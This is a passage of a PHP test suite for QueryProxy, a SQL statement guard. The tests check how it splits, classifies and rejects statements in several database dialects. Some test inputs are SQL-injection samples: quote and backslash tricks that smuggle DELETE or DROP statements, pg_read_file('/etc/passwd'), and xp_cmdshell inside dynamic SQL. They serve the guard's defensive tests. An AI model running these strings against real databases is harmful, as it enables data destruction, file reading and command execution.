    expect(inspect($sql, DbDriver::Sqlsrv)->passes())->toBeFalse();
})->with([
    'DML inside parentheses' => 'SELECT * FROM (DELETE FROM t) x',
    'BEGIN without END' => 'BEGIN SELECT 1',
    'END without BEGIN' => 'SELECT 1 END',
    'END TRY closing a plain BEGIN' => 'BEGIN SELECT 1 END TRY',
    'ELSE without IF' => 'ELSE SELECT 1',
    'unbalanced parentheses' => 'SELECT (1',
    'embedded transaction' => 'BEGIN TRAN DELETE FROM t WHERE id = 1 COMMIT',
    'embedded rollback' => 'SELECT 1 ROLLBACK',
    'BEGIN DIALOG' => 'BEGIN DIALOG @h FROM SERVICE s TO SERVICE \'t\'',
    'statement inside CASE' => 'SELECT CASE WHEN 1 = 1 THEN 1 DELETE FROM t END',
    'a word where a statement is expected' => 'IF 1 = 1 BEGIN x END',
]);

test('ordinary SQL Server batches and statements still pass', function (string $sql, StatementType $type) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe($type);
})->with([
    'IF ... ELSE of reads' => ['IF @x = 1 SELECT 1 ELSE SELECT 2', StatementType::Read],
    'two reads' => ['SELECT 1 SELECT 2', StatementType::Read],
    'CTE with a leading semicolon' => [';WITH c AS (SELECT 1 a) SELECT * FROM c', StatementType::Read],
    'CTE feeding a DELETE' => ['WITH c AS (SELECT id FROM s) DELETE FROM t WHERE id IN (SELECT id FROM c)', StatementType::Write],
    'full MERGE' => ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET t.a = s.a WHEN NOT MATCHED THEN INSERT (id, a) VALUES (s.id, s.a);', StatementType::Write],
    'EXISTS subquery' => ['SELECT * FROM t WHERE EXISTS (SELECT 1 FROM s WHERE s.id = t.id)', StatementType::Read],
    'IN subquery' => ['DELETE FROM t WHERE id IN (SELECT id FROM s)', StatementType::Write],
    'INSERT ... SELECT' => ['INSERT INTO t SELECT * FROM s', StatementType::Write],
    'INSERT ... VALUES' => ['INSERT INTO t (a) VALUES (1)', StatementType::Write],
    'UPDATE ... FROM' => ['UPDATE t SET a = s.a FROM t JOIN s ON s.id = t.id WHERE t.id = 1', StatementType::Write],
    'UNION' => ['SELECT 1 UNION ALL SELECT 2', StatementType::Read],
    'OFFSET ... FETCH' => ['SELECT * FROM t ORDER BY id OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY', StatementType::Read],
    'CASE with ELSE and END' => ["SELECT CASE WHEN a = 1 THEN 'x' ELSE 'y' END FROM t", StatementType::Read],
    'TRY ... CATCH of reads' => ['BEGIN TRY SELECT 1 END TRY BEGIN CATCH SELECT 2 END CATCH', StatementType::Read],
    'WHILE with a block' => ['WHILE @i < 3 BEGIN SET @i = @i + 1 END', StatementType::Write],
    'THROW after a condition' => ["IF @x = 1 THROW 51000, 'm', 1", StatementType::Write],
    'IF NOT EXISTS and IS NOT NULL' => ['IF NOT EXISTS (SELECT 1 FROM t) AND @x IS NOT NULL SELECT 1 ELSE SELECT 2', StatementType::Read],
    'function condition' => ["IF OBJECT_ID('t') IS NULL AND dbo.f(1) = 1 SELECT 1", StatementType::Read],
    'nested IF in a block before ELSE' => ['IF @x = 1 BEGIN IF @y = 1 SELECT 1 END ELSE SELECT 2', StatementType::Read],
    'bare RETURN before a statement' => ['IF @x IS NULL RETURN SELECT 1', StatementType::Read],
    'aliases of every form' => ["SELECT a AS [b], c 'd', e f, g = 1, N'x' h FROM t AS u SELECT 1", StatementType::Read],
    'TOP, WITH TIES and table hints' => ['SELECT DISTINCT TOP (3) WITH TIES t.* FROM dbo.t t WITH (NOLOCK) ORDER BY a DESC SELECT 1', StatementType::Read],
    'FOR XML and ROLLUP' => ["SELECT a FROM t GROUP BY a WITH ROLLUP FOR XML PATH('r'), ROOT('x') SELECT 1", StatementType::Read],
    'APPLY and PIVOT' => ['SELECT * FROM t CROSS APPLY f(t.a) x PIVOT (SUM(a) FOR b IN ([x], [y])) p SELECT 1', StatementType::Read],
    'AT TIME ZONE and FOR SYSTEM_TIME' => ["SELECT a AT TIME ZONE 'UTC' AS z FROM t FOR SYSTEM_TIME AS OF '2020-01-01' SELECT 1", StatementType::Read],
    'INSERT ... DEFAULT VALUES and EXEC' => ['INSERT t DEFAULT VALUES INSERT INTO #t EXEC p 1', StatementType::Write],
    'MERGE DELETE action' => ['MERGE t USING s ON t.id = s.id WHEN MATCHED THEN DELETE SELECT 1', StatementType::Write],
    'SET switches before a DELETE' => ['SET NOCOUNT ON DELETE FROM t WHERE a = 1', StatementType::Write],
    'SET switch lists' => ['SET XACT_ABORT, NOCOUNT ON SET STATISTICS IO, TIME OFF SELECT 1', StatementType::Write],
    'SET IDENTITY_INSERT around an INSERT' => ['SET IDENTITY_INSERT dbo.t ON INSERT INTO t (a) VALUES (1) SET IDENTITY_INSERT [dbo].[t] OFF', StatementType::Write],
    'SET TRANSACTION ISOLATION LEVEL' => ['SET TRANSACTION ISOLATION LEVEL READ COMMITTED SELECT 1', StatementType::Write],
    'SET settings with values' => ['SET DEADLOCK_PRIORITY -5 SET LANGUAGE us_english SET DATEFORMAT dmy SET LOCK_TIMEOUT 1000 SET CONTEXT_INFO 0x1F SELECT 1', StatementType::Write],
    'SET of a variable' => ['DECLARE @x int SET @x = @@ROWCOUNT SET @x += 1 SELECT @x', StatementType::Write],
    'DECLARE lists, tables and initializers' => ["DECLARE @x varchar(10) = N'a', @t TABLE (a int), @d AS dbo.T, @n decimal(10, 2) = 1.5 SELECT @x", StatementType::Write],
    'DECLARE with a subquery and CASE' => ['DECLARE @x int = (SELECT COUNT(*) FROM t) IF @x > 0 SET @x = CASE WHEN @x > 1 THEN 2 ELSE 1 END SELECT @x', StatementType::Write],
    'DECLARE CURSOR' => ['DECLARE c CURSOR LOCAL FAST_FORWARD FOR SELECT a FROM t OPEN c', StatementType::Write],
    'PRINT of an expression' => ["DECLARE @d datetime = GETDATE() PRINT 'done: ' + CAST(@d AS varchar(30))", StatementType::Write],
    'bare THROW in CATCH' => ['BEGIN TRY SELECT 1 END TRY BEGIN CATCH THROW END CATCH', StatementType::Write],
    'THROW with arguments before ELSE' => ["IF @x IS NULL THROW 51000, 'm', 1 ELSE PRINT 'ok'", StatementType::Write],
    'EXEC with a bare argument' => ['EXEC sp_who active SELECT 1', StatementType::Write],
    'EXEC with named, OUTPUT and WITH RECOMPILE arguments' => ["EXEC dbo.p @a = 1, @b = @c OUTPUT, @d = DEFAULT WITH RECOMPILE EXEC p N'x', @y OUT", StatementType::Write],
    'EXECUTE AS and REVERT' => ["EXECUTE AS USER = 'u' SELECT 1 REVERT", StatementType::Write],
    'RAISERROR with options' => ["RAISERROR('m', 16, 1) WITH NOWAIT RAISERROR 50001 'x'", StatementType::Write],
    'USE before a query' => ['USE [db] SELECT 1', StatementType::Write],
    'DBCC with options' => ["DBCC CHECKDB (db) WITH NO_INFOMSGS DBCC CHECKIDENT ('t', RESEED, 0)", StatementType::Write],
    'WAITFOR' => ["WAITFOR DELAY '00:00:01' WAITFOR TIME '10:00' SELECT 1", StatementType::Write],
    'cursor statements' => ['DECLARE c CURSOR FOR SELECT a FROM t OPEN c FETCH NEXT FROM c INTO @a, @b CLOSE c DEALLOCATE c', StatementType::Write],
    'BACKUP and RESTORE' => ["BACKUP DATABASE d TO DISK = 'x' WITH INIT RESTORE DATABASE d FROM DISK = 'x' WITH MOVE 'a' TO 'b', REPLACE", StatementType::Write],
    'KILL, CHECKPOINT and RECONFIGURE' => ['KILL 5 WITH STATUSONLY CHECKPOINT RECONFIGURE WITH OVERRIDE', StatementType::Write],
    'THROW starting the batch' => ["THROW 50000, 'x', 1 SELECT 1", StatementType::Write],
    'EXEC with a return status and a bare argument' => ['EXEC @rc = p active', StatementType::Write],
    'REVERT WITH COOKIE' => ['REVERT WITH COOKIE = @c', StatementType::Write],
    'USE master before a query' => ['USE master SELECT 1', StatementType::Write],
    'CHECKPOINT with a duration' => ['CHECKPOINT 10 SELECT 1', StatementType::Write],
]);

test('a statement QueryProxy does not know is not taken into the one before it', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('cannot tell where the statements of this SQL Server batch end');
})->with([
    'DISABLE TRIGGER after IF' => 'IF 1 = 1 DISABLE TRIGGER ALL ON t',
    'ENABLE TRIGGER after WHILE' => 'WHILE 1 = 0 ENABLE TRIGGER ALL ON ALL SERVER',
    'ADD SIGNATURE after IF' => 'IF 1 = 1 ADD SIGNATURE TO dbo.p BY CERTIFICATE c',
    'DISABLE TRIGGER after a SELECT' => 'SELECT 1 DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after an alias' => 'SELECT 1 AS a DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after a table name' => 'SELECT a FROM t DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after a parenthesized query' => '(SELECT 1) DISABLE TRIGGER ALL ON t',
    'RECEIVE after IF' => 'IF 1 = 1 RECEIVE * FROM q',
    'RECEIVE after a SELECT' => 'SELECT 1 RECEIVE TOP (1) * FROM q',
    'RECEIVE after ORDER BY' => 'SELECT a FROM t ORDER BY a DESC RECEIVE * FROM q',
    'RECEIVE after RETURN' => 'RETURN RECEIVE * FROM q',
    'SEND after a SELECT' => 'SELECT 1 SEND ON CONVERSATION @h (@b)',
    'DISABLE TRIGGER after GOTO' => 'GOTO x DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after RETURN' => 'RETURN DISABLE TRIGGER ALL ON t',
    'unknown keyword after IF' => 'IF 1 = 1 FROBNICATE t',
    'unknown keyword after a SELECT' => 'SELECT 1 FROBNICATE TABLE t',
    'unknown keyword starting the batch' => 'FROBNICATE t SELECT 1',
    'DISABLE TRIGGER after a SET switch' => 'SET NOCOUNT ON DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after SET of a variable' => 'SET @x = 1 DISABLE TRIGGER ALL ON t',
    'SEND after SET TRANSACTION ISOLATION LEVEL' => 'SET TRANSACTION ISOLATION LEVEL READ COMMITTED SEND ON CONVERSATION @h',
    'unknown keyword after a SET switch' => 'SET NOCOUNT ON FROBNICATE',
    'unknown SET option' => 'SET FROBNICATE ON',
    'DISABLE TRIGGER after DECLARE' => 'DECLARE @x int DISABLE TRIGGER ALL ON t',
    'unknown keyword after a DECLARE initializer' => 'DECLARE @x int = 5 FROBNICATE',
    'DISABLE TRIGGER after a DECLARE CURSOR query' => 'DECLARE c CURSOR LOCAL FOR SELECT a FROM t DISABLE TRIGGER ALL ON t',
    'RECEIVE after PRINT' => "PRINT 'x' RECEIVE TOP (1) * FROM q",
    'DISABLE TRIGGER after THROW with arguments' => "IF 1 = 1 THROW 51000, 'm', 1 DISABLE TRIGGER ALL ON t",
    'DISABLE TRIGGER after a bare THROW' => 'BEGIN TRY SELECT 1 END TRY BEGIN CATCH THROW DISABLE TRIGGER ALL ON t END CATCH',
    'DISABLE TRIGGER after EXEC' => 'EXEC p 1 DISABLE TRIGGER ALL ON t',
    'RECEIVE after the bare argument of an EXEC' => 'EXEC p active RECEIVE * FROM q',
    'RECEIVE after an OUTPUT argument' => 'EXEC p @x OUTPUT RECEIVE * FROM q',
    'RECEIVE after a DEFAULT argument' => 'EXEC p @a = DEFAULT RECEIVE * FROM q',
    'RECEIVE after INSERT ... EXEC' => 'INSERT INTO #t EXEC p 1 RECEIVE * FROM q',
    'DISABLE TRIGGER after RAISERROR' => "RAISERROR('m', 16, 1) DISABLE TRIGGER ALL ON t",
    'DISABLE TRIGGER after USE' => 'USE db DISABLE TRIGGER ALL ON t',
    'RECEIVE after USE' => 'USE [db] RECEIVE * FROM q',
    'DISABLE TRIGGER after DBCC' => 'DBCC CHECKDB WITH NO_INFOMSGS DISABLE TRIGGER ALL ON t',
    'SEND after KILL' => 'KILL 5 SEND ON CONVERSATION @h',
    'unknown keyword after WAITFOR' => "WAITFOR DELAY '00:00:01' FROBNICATE",
    'DISABLE TRIGGER after a cursor statement' => 'OPEN c DISABLE TRIGGER ALL ON t',
    'ADD SIGNATURE after TRUNCATE' => 'TRUNCATE TABLE t ADD SIGNATURE TO dbo.p BY CERTIFICATE c',
    'RECEIVE after DENY' => 'DENY SELECT ON t TO u CASCADE RECEIVE * FROM q',
    'RECEIVE after UPDATE STATISTICS' => 'UPDATE STATISTICS t RECEIVE * FROM q',
    'RECEIVE after DROP' => 'DROP TABLE IF EXISTS t RECEIVE * FROM q',
    'DISABLE TRIGGER after CREATE INDEX' => 'CREATE INDEX ix ON t (a) DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after REVERT' => 'REVERT DISABLE TRIGGER ALL ON DATABASE',
    'DISABLE TRIGGER after CHECKPOINT' => 'CHECKPOINT DISABLE TRIGGER ALL ON t',
    'ENABLE TRIGGER after RECONFIGURE' => 'RECONFIGURE ENABLE TRIGGER tr ON t',
    'RECEIVE after SETUSER' => 'SETUSER RECEIVE * FROM q',
    'DISABLE TRIGGER after the procedure name of an EXEC' => 'EXEC p DISABLE TRIGGER ALL ON DATABASE',
    'DISABLE TRIGGER after USE master' => 'USE master DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after a procedure named like a body keyword' => 'EXEC log DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after OPEN of a cursor' => 'OPEN cache DISABLE TRIGGER ALL ON t',
    'DISABLE TRIGGER after THROW starting the batch' => "THROW 50000, 'x', 1 DISABLE TRIGGER ALL ON t",
    'RECEIVE after a bare THROW starting the batch' => 'THROW RECEIVE * FROM q',
]);

test('DENY is rejected like GRANT and REVOKE', function (DbDriver $driver) {
    foreach (['DENY SELECT ON t TO u', 'BEGIN; DENY SELECT ON t TO u; COMMIT;'] as $sql) {
        $result = inspect($sql, $driver);

        expect($result->passes())->toBeFalse()
            ->and(implode(' ', $result->violations))->toContain('DENY statements are not allowed');
    }
})->with(DbDriver::cases());

test('a statement starting with an unknown word is not a read even when a query follows it', function (DbDriver $driver) {
    // The parser skips a leading word it does not know and parses the rest as
    // a SELECT; the statement must still not take the transactionless read path.
    expect(inspect('FROBNICATE SELECT * FROM t', $driver)->type())->not->toBe(StatementType::Read);
})->with(DbDriver::cases());

test('DENY after a query in a SQL Server batch is rejected', function () {
    $result = inspect('SELECT 1 DENY SELECT ON t TO u', DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('DENY statements are not allowed');
});

test('each ELSE takes an IF of its own', function () {
    $result = inspect('IF 1 = 1 IF 2 = 2 SELECT 1 ELSE SELECT 2 ELSE SELECT 3 ELSE SELECT 4', DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('ELSE without a preceding IF')
        ->and(inspect('IF 1 = 1 IF 2 = 2 SELECT 1 ELSE SELECT 2 ELSE SELECT 3', DbDriver::Sqlsrv)->violations)->toBe([]);
});

test('SQL Server DDL with keywords that also start statements stays one statement', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->violations)->toBe([])
        ->and($result->hasDdl())->toBeTrue();
})->with([
    'foreign key actions' => 'ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (a) REFERENCES p(id) ON DELETE CASCADE ON UPDATE SET NULL',
    'ALTER COLUMN' => 'ALTER TABLE t ALTER COLUMN a int',
    'DROP COLUMN' => 'ALTER TABLE t DROP COLUMN a',
    'DROP ... IF EXISTS' => 'DROP TABLE IF EXISTS t',
    'procedure body' => 'CREATE PROCEDURE p AS BEGIN SELECT 1 DELETE FROM t END',
]);

test('SQL Server temporary tables are names, not comments', function (string $sql, StatementType $type, string $prepared) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe($type)
        ->and($result->statements[0]->sql)->toBe($sql)
        ->and($result->statements[0]->preparedSql)->toBe($prepared);
})->with([
    'local temporary table' => ['SELECT * FROM #t WHERE id = 1', StatementType::Read, 'SELECT TOP (1000) * FROM #t WHERE id = 1'],
    'global temporary table' => ['SELECT * FROM ##t', StatementType::Read, 'SELECT TOP (1000) * FROM ##t'],
    'bracketed temporary table' => ['SELECT * FROM [#t]', StatementType::Read, 'SELECT TOP (1000) * FROM [#t]'],
    'insert into a temporary table' => ['INSERT INTO #t (a) VALUES (1)', StatementType::Write, 'INSERT INTO #t (a) VALUES (1)'],
]);

test('a statement after a SQL Server temporary table is still inspected', function (string $sql) {
    expect(inspect($sql, DbDriver::Sqlsrv)->passes())->toBeFalse();
})->with([
    'DELETE without WHERE on the same line' => 'SELECT * FROM #t WHERE id = 1 DELETE FROM #t',
    'second statement after a semicolon' => 'SELECT 1 FROM #t; DROP TABLE users',
    'DEL character next to a temporary table' => "SELECT 1 FROM #t\x7F",
]);

test('# keeps its comment meaning in MySQL and is refused as an operator in PostgreSQL', function () {
    $mysql = inspect("SELECT * FROM t # DELETE FROM t\n", DbDriver::Mysql);
    $pgsql = inspect('SELECT 5 # 3', DbDriver::Pgsql);

    expect($mysql->violations)->toBe([])
        ->and($mysql->type())->toBe(StatementType::Read)
        ->and($pgsql->passes())->toBeFalse()
        ->and($pgsql->violations[0])->toContain('"#" is an operator in PostgreSQL');
});

// --- PostgreSQL reads backslashes and "#" differently from the lexer ---

test('SQL PostgreSQL reads differently because of a backslash or "#" is refused', function (string $sql, ?DbDriver $driver, string $needle) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->statements)->toBe([])
        ->and($result->violations)->toHaveCount(1)
        ->and($result->violations[0])->toContain($needle);
})->with([
    'backslash ends a string, second statement' => ["SELECT 'a\\'; DELETE FROM users; --'", DbDriver::Pgsql, 'reads a backslash'],
    '"#" hides a second statement' => ['SELECT 1 # 1; DELETE FROM users', DbDriver::Pgsql, '"#" is an operator'],
    'backslash hides a file IO call' => ["SELECT 'a\\', pg_read_file('/etc/passwd') --'", DbDriver::Pgsql, 'reads a backslash'],
    'backslash in a quoted identifier' => ['SELECT "a\\b" FROM t', DbDriver::Pgsql, 'reads a backslash'],
    'XOR operator' => ['SELECT 1 # 2', DbDriver::Pgsql, '"#" is an operator'],
    'backslash in an N string' => ["SELECT N'a\\' AS x", DbDriver::Pgsql, 'reads a backslash'],
    'backslash outside any string' => ['SELECT 1 \\ 2', DbDriver::Pgsql, 'reads a backslash'],
    'malformed U& escape before the quote' => ["SELECT U&'a\\', pg_read_file('/etc/passwd') --'", DbDriver::Pgsql, 'reads a backslash'],
    'E prefix glued to a name is not an E string' => ["SELECT nameE'a\\' AS x", DbDriver::Pgsql, 'reads a backslash'],
    '"#" after a block comment' => ['SELECT 1 /* x */ # 2', DbDriver::Pgsql, '"#" is an operator'],
    'unknown driver, backslash' => ["SELECT 'a\\'; DELETE FROM users; --'", null, 'when the target database is unknown'],
    'unknown driver, "#"' => ['SELECT 1 # 1; DELETE FROM users', null, 'when the target database is unknown'],
]);

test('the backslash advice fits whether the dialect is known', function () {
    $unknown = inspect("SELECT 'it\\'s' AS x", null)->violations[0];
    $postgres = inspect("SELECT 'it\\'s' AS x", DbDriver::Pgsql)->violations[0];

    expect($unknown)->toContain('Select a connection')
        ->not->toContain("Use an E'...' string")
        ->and($postgres)->toContain("Use an E'...' string")
        ->not->toContain('Select a connection');
});

test('backslashes and "#" PostgreSQL reads like the lexer still pass', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'E string escape' => "SELECT E'a\\\\b' AS x",
    'lower-case e string escape' => "SELECT e'it\\'s' AS x",
    'doubled quote' => "SELECT 'it''s' AS x",
    'dollar-quoted body' => 'SELECT $$a\\b # c$$ AS x',
    'tagged dollar-quoted body' => 'SELECT $q$a\\b # c$q$ AS x',
    '"#" in a line comment' => 'SELECT 1 -- # yorum',
    'backslash and "#" in a block comment' => 'SELECT 1 /* \\ # */',
    '"#" in a string' => "SELECT '#' AS x",
    '"#" in a quoted identifier' => 'SELECT 1 AS "a#b"',
    'well-formed U& string escapes' => "SELECT U&'\\0041\\+000042\\\\' AS x",
]);

test('MySQL and MariaDB keep reading backslashes and "#" as before', function (DbDriver $driver) {
    $escaped = inspect("SELECT 'a\\'b' AS x", $driver);
    $comment = inspect("SELECT 1 # yorum\n", $driver);

    expect($escaped->violations)->toBe([])
        ->and($escaped->type())->toBe(StatementType::Read)
        ->and($comment->violations)->toBe([])
        ->and($comment->type())->toBe(StatementType::Read);
})->with([DbDriver::Mysql, DbDriver::Mariadb]);

test('quoting the guard reads differently from SQL Server or SQLite is rejected', function (string $sql, DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'sqlsrv, backslash before a closing quote' => ["SELECT 'a\\' EXEC xp_cmdshell 'dir' --'", DbDriver::Sqlsrv],
    'sqlite, backslash before a closing quote' => ["SELECT 'a\\' ATTACH 'x' AS y --'", DbDriver::Sqlite],
    'sqlsrv, dollar quote' => ["SELECT \$\$a\$\$ EXEC xp_cmdshell 'dir' --\$\$", DbDriver::Sqlsrv],
    'mysql, dollar quote' => ['SELECT $$a$$', DbDriver::Mysql],
    'sqlite, dollar quote' => ['SELECT $$a$$', DbDriver::Sqlite],
]);

test('multibyte text does not move statement boundaries', function (DbDriver $driver) {
    $result = inspect("BEGIN; SELECT 'ğğğğ'; DELETE FROM users WHERE id = 1; COMMIT;", $driver);

    expect($result->violations)->toBe([])
        ->and($result->statements)->toHaveCount(2)
        ->and($result->statements[1]->sql)->toBe('DELETE FROM users WHERE id = 1');
})->with([
    'mysql' => DbDriver::Mysql,
    'pgsql' => DbDriver::Pgsql,
    'sqlsrv' => DbDriver::Sqlsrv,
]);

// --- Dynamic SQL and CTE bodies ---

test('a statement held in dynamic SQL or a CTE is judged like a top-level one', function (string $sql, DbDriver $driver, string $violation) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toContain($violation);
})->with([
    'sqlsrv, EXEC literal' => ["EXEC('DELETE FROM t')", DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'sqlsrv, sp_executesql' => ["EXEC sp_executesql N'UPDATE t SET a = 1'", DbDriver::Sqlsrv, 'Statement 1: UPDATE without a WHERE clause is not allowed.'],
    'sqlsrv, sp_executesql with a named @stmt' => ["EXEC sp_executesql @stmt = N'DELETE FROM t'", DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'sqlsrv, EXEC of an N literal' => ["EXEC(N'DELETE FROM t')", DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'sqlsrv, sp_executesql without EXEC' => ["sp_executesql N'DELETE FROM t'", DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'sqlsrv, INSERT ... EXEC literal' => ["INSERT INTO t EXEC('DELETE FROM x')", DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'sqlsrv, procedure in an EXEC literal' => ["EXEC('EXEC xp_cmdshell ''dir''')", DbDriver::Sqlsrv, 'Statement 1: xp_cmdshell is not allowed through QueryProxy: it runs operating-system commands, changes the server configuration or reaches another server.'],
    'sqlsrv, WITH ... DELETE' => ['WITH a AS (SELECT 1 AS x) DELETE FROM t', DbDriver::Sqlsrv, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'mysql, WITH ... DELETE' => ['WITH a AS (SELECT 1 AS x) DELETE FROM t', DbDriver::Mysql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'pgsql, WITH ... UPDATE' => ['WITH a AS (SELECT 1) UPDATE t SET x = 1', DbDriver::Pgsql, 'Statement 1: UPDATE without a WHERE clause is not allowed.'],
    'pgsql, DELETE in a CTE' => ['WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d', DbDriver::Pgsql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'pgsql, UPDATE in a second CTE' => ['WITH a AS (SELECT 1), b AS (UPDATE t SET x = 1 RETURNING *) SELECT * FROM b', DbDriver::Pgsql, 'Statement 1: UPDATE without a WHERE clause is not allowed.'],
    'pgsql, DELETE in a CTE with its own WITH' => ['WITH d AS (WITH x AS (SELECT 1) DELETE FROM t RETURNING *) SELECT * FROM d', DbDriver::Pgsql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'pgsql, UPDATE in a CTE with its own WITH' => ['WITH d AS (WITH x AS (SELECT 1) UPDATE t SET a = 1 RETURNING *) SELECT * FROM d', DbDriver::Pgsql, 'Statement 1: UPDATE without a WHERE clause is not allowed.'],
    'pgsql, DELETE two WITH levels down' => ['WITH d AS (WITH e AS (WITH f AS (SELECT 1) DELETE FROM t RETURNING *) SELECT * FROM e) SELECT * FROM d', DbDriver::Pgsql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'pgsql, WITH RECURSIVE ... DELETE' => ['WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) DELETE FROM t', DbDriver::Pgsql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'mysql, WITH RECURSIVE ... DELETE' => ['WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) DELETE FROM t', DbDriver::Mysql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'pgsql, PREPARE ... AS' => ['PREPARE s AS DELETE FROM t', DbDriver::Pgsql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'mysql, PREPARE ... FROM' => ["BEGIN; PREPARE s FROM 'DELETE FROM t'; EXECUTE s; COMMIT;", DbDriver::Mysql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
    'mysql, EXECUTE IMMEDIATE' => ["EXECUTE IMMEDIATE 'DELETE FROM t'", DbDriver::Mysql, 'Statement 1: DELETE without a WHERE clause is not allowed.'],
]);

test('dynamic SQL QueryProxy cannot read is rejected', function (string $sql, DbDriver $driver, string $reason) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($reason);
})->with([
    'sqlsrv, EXEC of a variable' => ['EXEC(@sql)', DbDriver::Sqlsrv, 'EXEC (...) with a statement QueryProxy cannot read'],
    'sqlsrv, sp_executesql of a variable' => ['EXEC sp_executesql @stmt', DbDriver::Sqlsrv, 'sp_executesql with a statement QueryProxy cannot read'],
    'sqlsrv, EXEC of a concatenation' => ["EXEC('SELECT 1' + 'x')", DbDriver::Sqlsrv, 'EXEC (...) with a statement QueryProxy cannot read'],
    'sqlsrv, EXEC on a linked server' => ["EXEC('SELECT 1') AT srv", DbDriver::Sqlsrv, 'EXEC (...) with a statement QueryProxy cannot read'],
    'sqlsrv, EXEC as another user' => ["EXEC('SELECT 1') AS USER = 'x'", DbDriver::Sqlsrv, 'EXEC (...) with a statement QueryProxy cannot read'],
    'sqlsrv, backslash in the literal' => ["EXEC('SELECT ''a\\b''')", DbDriver::Sqlsrv, 'EXEC (...) with a statement QueryProxy cannot read'],
    'sqlsrv, sp_msforeachtable' => ["EXEC sp_msforeachtable 'DELETE FROM ?'", DbDriver::Sqlsrv, 'sp_msforeachtable is not allowed through QueryProxy'],
    'sqlsrv, sp_send_dbmail' => ["EXEC msdb.dbo.sp_send_dbmail @query = 'SELECT 1'", DbDriver::Sqlsrv, 'sp_send_dbmail is not allowed through QueryProxy'],
    'sqlsrv, sp_send_dbmail without a query' => ["EXEC msdb.dbo.sp_send_dbmail @recipients = 'a@b.c', @body = 'x'", DbDriver::Sqlsrv, 'sp_send_dbmail is not allowed through QueryProxy'],
    'sqlsrv, sp_prepexec' => ["EXEC sp_prepexec @h OUTPUT, NULL, N'DELETE FROM t'", DbDriver::Sqlsrv, 'sp_prepexec is not allowed through QueryProxy'],
    'sqlsrv, transaction control in EXEC' => ["EXEC('BEGIN TRAN; DELETE FROM t WHERE id = 1; COMMIT TRAN')", DbDriver::Sqlsrv, 'Transaction control (BEGIN TRAN, COMMIT, ROLLBACK, SAVE TRAN) inside a SQL Server batch'],
    'sqlsrv, COMMIT TRANSACTION in EXEC' => ["EXEC('DELETE FROM t WHERE id = 1; COMMIT TRANSACTION')", DbDriver::Sqlsrv, 'Transaction control (BEGIN TRAN, COMMIT, ROLLBACK, SAVE TRAN) inside a SQL Server batch'],
    'mysql, PREPARE from a variable' => ['BEGIN; PREPARE s FROM @q; EXECUTE s; COMMIT;', DbDriver::Mysql, 'a PREPARE QueryProxy cannot read'],
    'mysql, EXECUTE IMMEDIATE of an expression' => ["EXECUTE IMMEDIATE CONCAT('DELETE', ' FROM t')", DbDriver::Mysql, 'EXECUTE IMMEDIATE with a statement QueryProxy cannot read'],
    'mysql, transaction control in EXECUTE IMMEDIATE' => ["EXECUTE IMMEDIATE 'COMMIT'", DbDriver::Mysql, 'transaction control inside dynamic SQL is not allowed'],
    'pgsql, WITH clause without a body' => ['WITH a AS SELECT 1', DbDriver::Pgsql, 'a WITH clause QueryProxy cannot read'],
]);

test('transaction control in SQL Server dynamic SQL is reported once', function () {
    expect(inspect("EXEC('ROLLBACK')", DbDriver::Sqlsrv)->violations)->toBe([
        'Statement 1: Transaction control (BEGIN TRAN, COMMIT, ROLLBACK, SAVE TRAN) inside a SQL Server batch is not allowed: QueryProxy runs the request in its own transaction.',
    ]);
});

test('readable dynamic SQL and CTEs that follow the rules pass as writes', function (string $sql, DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'sqlsrv, EXEC literal' => ["EXEC('DELETE FROM t WHERE id = 1')", DbDriver::Sqlsrv],
